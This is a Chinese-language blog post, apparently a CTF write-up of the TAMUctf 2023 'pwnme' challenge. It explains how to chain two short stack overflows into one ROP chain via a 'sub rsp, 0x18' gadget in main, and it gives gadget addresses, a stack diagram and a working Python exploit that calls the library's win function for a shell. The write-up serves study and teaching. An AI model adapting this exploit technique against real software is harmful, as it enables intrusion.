---
layout: post
title: TAMUctf 2023 Pwnme - linked ROP chain
date: 2023-05-04 07:55:01
tags: pwn rop
---

当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 `leave; ret` 或是 `xchg eax, esp` 等方法完成栈迁移。
但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 `sub rsp, 0x18; call vul` 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。

比赛时和前辈两人看这题看了几个小时，找gadget找了很久也没做出来。比赛结束后发现了两个版本的做法，分别是[官方的](https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/pwnme)和[Chovid99师傅的](https://chovid99.github.io/posts/tamuctf-2023/#pwnme)的。官方的做法比较一般，并且和我们比赛时的思路完全一致（只是我们傻了没发现那个关键gadget），因此本文主要分析官方的做法。

<!-- more -->

题目给了两个binary：
- pwnme：什么函数都没有，只有一个main函数调用了libpwnme库的pwnme函数。
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
- libpwnme.so：pwnme函数，以及一个调用即get shell的win函数。
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

漏洞函数很朴实，就是一个简单的栈溢出：

```c
ssize_t pwnme()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  setup();
  puts("pwn me");
  return read(0, buf, 0x48uLL);
}
```

我们的目标是调用win函数，但win函数位于libpwnme中，其地址是随机变化的。
我们ROP使用的gadget，要么来自于已知的地址，要么来自于经过partial overwrite的栈上已有的地址。
在这道题中，能够partial overwrite的只有__libc_start_main的返回地址，但这个地址和win函数差的很远（尽管它们的偏移是确定的值），需要爆破约12个bits才行。因此暂时放弃这种思路。

我们可以用到的gadget，只有pwnme binary中的gadget，然而这个binary除了调用pwnme的main函数之外，可以说啥都没有。GOT上除了__libc_start_main和pwnme就没有别的函数了。
不过，如果用心找找，还是能找到一些有用的gadget，我找到的如下：

```
0x000000000040118b : pop rdi ; ret
0x0000000000401191 : mov rax, qword ptr [rdi] ; ret

0x0000000000401189 : pop rsi ; pop r15 ; ret
0x00000000004011b2 : sub rax, rsi ; ret

0x0000000000401010 : call rax
0x000000000040109c : jmp rax

0x0000000000401016 : ret
```

用这些gadget我们可以取出GOT中pwnme的地址，然后加上一个偏移并执行，这样就可以执行位于pwnme-0x18位置的win函数。但问题在于，题目允许溢出0x48字节，也就是从返回地址算起一共6个栏位（0x30）可以填ROP gadget。但使用这些gadget需要8*8=0x40字节才能完成对于pwnme的调用。

我比赛时想到了两种思路：
1. 分多次ROP完成，想办法在前后两次ROP之间，保存第一次ROP的成果（比如尝试保存rax），存到不会改变的寄存器、栈上或者某个内存地址；
2. 减小rsp，这样就可以复用之前输入的、位于栈上高位的payload。

对于第一种思路，我们寻找了很久gadget，并没有发现能够用上的，因此不得不放弃。
对于第二种思路，我们寻找了很久gadget，只找到了一个很难使用的 `pop rsp`，以及一些 `sub rsp, 0x18; add rsp, 0x18` 这样完全没用的gadget。

但这个gadget其实就放在pwnme binary的main函数中：

![](https://i.imgtg.com/2023/05/04/Ck43t.png)

通过这个gadget，我们可以将payload的后一部分先写到栈上，然后返回到main函数中，借助 `sub rsp, 0x18` 来向低位延申栈，然后再把payload的前一部分写到栈上，覆盖返回到main的gadget，构造一条完整的ROP链，如图所示：

```
      │        │    │        │
      ├────────┤    ├────────┤
      │Overflow│    │ROP     │
      │0x30 MAX│    │Part II │
      │        │    │        │
─────►│─ ─ ─ ─ ┤    ├────────┤◄─────
      │ret_addr│    │ROP     │
      ├────────┤    │Part I  │ sub rsp, 0x18
pwnme │savedrbp│    │        │
stack ├────────┤    │        │
      │Buffer  │    │        │
      │0x10    │    │        │
      │        │    │        │
─────►└────────┘    │─ ─ ─ ─ ┤◄─────
                    │        │
                    ├────────┤
                    │savedrbp│ pwnme
                    ├────────┤ stack
                    │Buffer  │
                    │0x10    │
                    │        │
                    └────────┘◄─────
```

图中第一次溢出时，将ret_addr覆盖为main的接近开头处，之后地址高位的部分填充payload后一部分。
第二次溢出时，填充payload前一部分，注意要把跳转到main的那个gadget给覆盖掉，完成两段ROP chain的链接。

理论上，只要从返回地址数起，能够溢出0x20字节，就可以完成上述操作。
如果将这种操作重复多次，就构造任意长度的ROP chain。

```python
def pwn():
    payload = b'a'*0x18 + pack(0x401199)
    payload += pack(0x18) + pack(0)
    payload += pack(0x4011b2)
    payload += pack(0x401016)
    payload += pack(0x401010)
    io.sendafter(b"pwn", payload)

    payload = b'a' * 0x18 + pack(0x40118b) + pack(elf.got["pwnme"])
    payload += pack(0x401191)
    payload += pack(0x401189)
    io.sendafter(b"pwn", payload)

    io.interactive()
```

另外，Chovid99师傅的解法也十分巧妙，是利用 `add byte ptr [rbp - 0x3d], bl` gadget修改pwnme binary中的GOT低位，来把pwnme地址变成win的地址。也很巧妙，学习！
